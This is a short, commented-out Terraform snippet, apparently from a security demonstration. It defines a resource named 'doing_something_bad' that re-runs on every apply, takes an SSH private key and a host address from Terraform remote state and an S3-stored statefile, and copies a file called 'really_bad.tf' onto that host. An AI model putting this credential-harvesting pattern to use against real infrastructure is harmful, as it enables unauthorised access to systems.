# resource "null_resource" "doing_something_bad" {

#   triggers = {
#     build_number = timestamp()
#   }

#   provisioner "file" {
#     source      = "really_bad.tf"
#     destination = "/home/ubuntu/"

#     connection {
#       type        = "ssh"
#       user        = "ubuntu"
#       private_key = data.terraform_remote_state.vpc.outputs.private_key
#       host        = jsondecode(data.aws_s3_object.entire_statefile.body).resources[1].instances[0].attributes.public_dns
#     }
#   }
# }